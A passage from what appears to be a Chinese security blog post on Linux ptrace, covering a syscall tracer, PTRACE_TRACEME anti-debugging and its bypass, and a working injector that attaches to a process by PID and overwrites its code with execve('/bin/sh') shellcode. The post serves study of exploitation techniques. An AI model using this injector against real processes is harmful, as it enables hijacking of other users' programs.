<p>使用 ptrace 的编程案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    <span class="keyword">long</span> syscallID;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> calling = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    child = fork();</span><br><span class="line">    <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* tracee表明自己想要被追踪 */</span></span><br><span class="line">        execl(<span class="string">&quot;./HelloWorld&quot;</span>, <span class="string">&quot;HelloWorld&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            syscallID = ptrace(PTRACE_PEEKUSER, child, <span class="number">8</span> * ORIG_RAX, <span class="number">0</span>); <span class="comment">/* 获取rax值从而判断将要执行的系统调用号 */</span></span><br><span class="line">            ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">            <span class="keyword">if</span>(calling == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SYS_call ID:%d\n&quot;</span>,syscallID);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SYS_call with rdi:0x%llx, rsi:0x%llx, rdx:0x%llx\n&quot;</span>,regs.rdi, regs.rsi, regs.rdx);</span><br><span class="line">                calling = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                calling = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* 在子进程进入和退出系统调用时都将其暂停 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>被测试的文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test               </span><br><span class="line">SYS_call ID:<span class="number">59</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x0</span>, rdx:<span class="number">0x0</span></span><br><span class="line">SYS_call ID:<span class="number">12</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x7f6f9d3ace2c</span>, rdx:<span class="number">0x4c</span></span><br><span class="line">SYS_call ID:<span class="number">158</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3001</span>, rsi:<span class="number">0x7ffc51d572c0</span>, rdx:<span class="number">0x7f6f9d3a32d0</span></span><br><span class="line">SYS_call ID:<span class="number">21</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d3af9e0</span>, rsi:<span class="number">0x4</span>, rdx:<span class="number">0x7f6f9d387270</span></span><br><span class="line">SYS_call ID:<span class="number">257</span></span><br><span class="line">SYS_call with rdi:<span class="number">0xffffff9c</span>, rsi:<span class="number">0x7f6f9d3acb80</span>, rdx:<span class="number">0x80000</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d564c0</span>, rdx:<span class="number">0x7ffc51d564c0</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">3</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">257</span></span><br><span class="line">SYS_call with rdi:<span class="number">0xffffff9c</span>, rsi:<span class="number">0x7f6f9d3b6f60</span>, rdx:<span class="number">0x80000</span></span><br><span class="line">SYS_call ID:<span class="number">0</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56668</span>, rdx:<span class="number">0x340</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56280</span>, rdx:<span class="number">0x310</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56250</span>, rdx:<span class="number">0x20</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56200</span>, rdx:<span class="number">0x44</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56510</span>, rdx:<span class="number">0x7ffc51d56510</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x2000</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56160</span>, rdx:<span class="number">0x310</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d55e40</span>, rdx:<span class="number">0x20</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d55e20</span>, rdx:<span class="number">0x44</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x1f1660</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d19f000</span>, rsi:<span class="number">0x178000</span>, rdx:<span class="number">0x5</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d317000</span>, rsi:<span class="number">0x4e000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d365000</span>, rsi:<span class="number">0x6000</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d36b000</span>, rsi:<span class="number">0x3660</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">3</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x29</span>, rdx:<span class="number">0x0</span></span><br><span class="line">SYS_call ID:<span class="number">158</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1002</span>, rsi:<span class="number">0x7f6f9d370540</span>, rdx:<span class="number">0xffff809062c8f1a0</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d365000</span>, rsi:<span class="number">0x4000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x5574d07f8000</span>, rsi:<span class="number">0x1000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d3b4000</span>, rsi:<span class="number">0x1000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">11</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d371000</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0xb9b00000000</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1</span>, rsi:<span class="number">0x7ffc51d57120</span>, rdx:<span class="number">0x7ffc51d57120</span></span><br><span class="line">SYS_call ID:<span class="number">12</span> <span class="comment">/* 调用&quot;brk-12&quot;为tcache struct分配空间 */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x21000</span>, rdx:<span class="number">0x2b0</span></span><br><span class="line">SYS_call ID:<span class="number">12</span> <span class="comment">/* 调用&quot;brk-12&quot;为标准输出分配缓存 */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x5574d1669000</span>, rsi:<span class="number">0x21000</span>, rdx:<span class="number">0x7f6f9d36c620</span></span><br><span class="line">Hello World!</span><br><span class="line">SYS_call ID:<span class="number">1</span> <span class="comment">/* 调用&quot;write-1&quot; */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1</span>, rsi:<span class="number">0x5574d16482a0</span>, rdx:<span class="number">0xd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以看见 tracee 从调用 <code>execve-59</code> 构建进程上下文到调用 <code>write-1</code> 的全过程</li>
</ul>
<p><strong>ptrace 的使用 - 反调试</strong></p>
<p>ptrace 反调试的核心就在于主动执行 PTRACE_TRACEME：</p>
<ul>
<li>如果当前进程已经被追踪了，就不能被其他父进程追踪</li>
<li>因此可以提前执行 PTRACE_TRACEME 命令来避免被 GDB 调试</li>
</ul>
<p>测试案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) ==<span class="number">-1</span> )</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t trace me！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;no one trace me！\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常执行结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ./test</span><br><span class="line">no one trace me！</span><br></pre></td></tr></table></figure>
<p>调试结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">don&#x27;t trace me！</span><br><span class="line">[Inferior 1 (process 4654) exited with code 01]</span><br></pre></td></tr></table></figure>
<p>绕过的方式很简单，只要把相关的地方给 nop 掉就好：</p>
<img src="/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/1667297539745.png" class width="1667297539745"> 
<p>可以直接查看符号表来确定是否存在 prtace：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> objdump -t test | grep ptrace</span><br><span class="line"><span class="number">0000000000000000</span>       F *UND*	<span class="number">0000000000000000</span>              ptrace@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">➜  <span class="built_in">exp</span> readelf -s test | grep ptrace</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND ptrace@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">2</span>)</span><br><span class="line">    <span class="number">60</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND ptrace@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
<p><strong>ptrace 的使用 - 代码注入</strong></p>
<p>ptrace 可以对进程的追踪，并进行流程控制：</p>
<ul>
<li>用户寄存器值读取和写入操作</li>
<li>内存进行读取和修改</li>
</ul>
<p>需要用到的 ptrace 命令如下：</p>
<ul>
<li>PTRACE_POKETEXT，PTRACE_POKEDATA：往内存地址中写入一个字节，内存地址由 addr 给出</li>
<li>PTRACE_PEEKTEXT，PTRACE_PEEKDATA：从内存地址中读取一个字节，内存地址由 addr 给出 </li>
<li>PTRACE_ATTACH：跟踪指定 pid 进程 </li>
<li>PTRACE_GETREGS：读取所有寄存器的值 </li>
<li>PTRACE_CONT：继续执行被跟踪的子进程，signal 为“0”则忽略引起调试进程中止的信号，若不为“0”则继续处理信号 signal </li>
<li>PTRACE_SETREGS：设置寄存器</li>
<li>PTRACE_DETACH：结束跟踪 </li>
</ul>
<p>下面程序用于在 tracee 中注入一段 shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace-abi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> word_size = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, word_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>));</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x48\x31\xd2\x52\x48\x89\xe6\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 尝试连接目标进程 */</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs); <span class="comment">/* 获取tracee的寄存器 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get target RIP: 0x%llx\n&quot;</span>,regs.rip);</span><br><span class="line">    putdata(pid,regs.rip,shellcode,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    regs.rip += <span class="number">6</span>;</span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs); <span class="comment">/* 设置寄存器 */</span></span><br><span class="line">    ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 继续执行被跟踪的子进程 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This process is attacked by %s&quot;</span>,__FUNCTION__);</span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 结束跟踪 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的 shellcode 就是 <code>execve(/bin/sh)</code>，汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<ul>
<li>进行编译：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp nasm -f elf64 sh.s -o sh.o</span><br><span class="line">➜  exp ld sh.o -o sh</span><br></pre></td></tr></table></figure>
<ul>
<li>显示二进制代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  exp objdump --disassemble ./sh</span><br><span class="line"></span><br><span class="line">./sh：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:	48 31 d2             	xor    %rdx,%rdx</span><br><span class="line">  401003:	52                   	push   %rdx</span><br><span class="line">  401004:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401007:	48 b8 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rax</span><br><span class="line">  40100e:	2f 73 68 </span><br><span class="line">  401011:	50                   	push   %rax</span><br><span class="line">  401012:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401015:	48 31 c0             	xor    %rax,%rax</span><br><span class="line">  401018:	b0 3b                	mov    $0x3b,%al</span><br><span class="line">  40101a:	0f 05                	syscall </span><br></pre></td></tr></table></figure>
<p>测试文件如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;pid=%d\n&quot;</span>,getpid());</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> num=<span class="number">0</span>;num&lt;<span class="number">20</span>;num++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;num = %d\n&quot;</span>,num);</span><br><span class="line">		sleep(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/" class="post-title-link" itemprop="url">Tty_struct Attack+Modprobe_path Attack+Cred Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

